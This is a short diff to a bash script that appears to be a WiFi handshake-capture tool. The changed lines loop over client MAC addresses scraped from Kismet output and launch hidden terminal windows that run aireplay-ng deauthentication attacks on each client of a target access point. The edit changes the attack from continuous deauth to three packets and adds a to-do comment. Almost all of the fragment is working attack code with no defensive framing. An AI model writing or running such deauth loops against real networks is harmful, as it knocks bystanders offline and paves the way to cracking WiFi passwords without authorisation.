@@ -245,7 +245,7 @@ else
         target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")
         
         for target_device in $target_devices; do
-            gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" "$wifi_adapter"mon
+            gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 3 -a "$bssid_address" -c "$target_device" "$wifi_adapter"mon
         done
         
         echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         
@@ -304,7 +304,7 @@ gnome-terminal --geometry=1x1-10000-10000 -- sudo systemctl start NetworkManager
 
 
 # Fix:
-#
+# for open network Don't scan again, just show the list again
 
 # To Do:
 # - Add sort by power
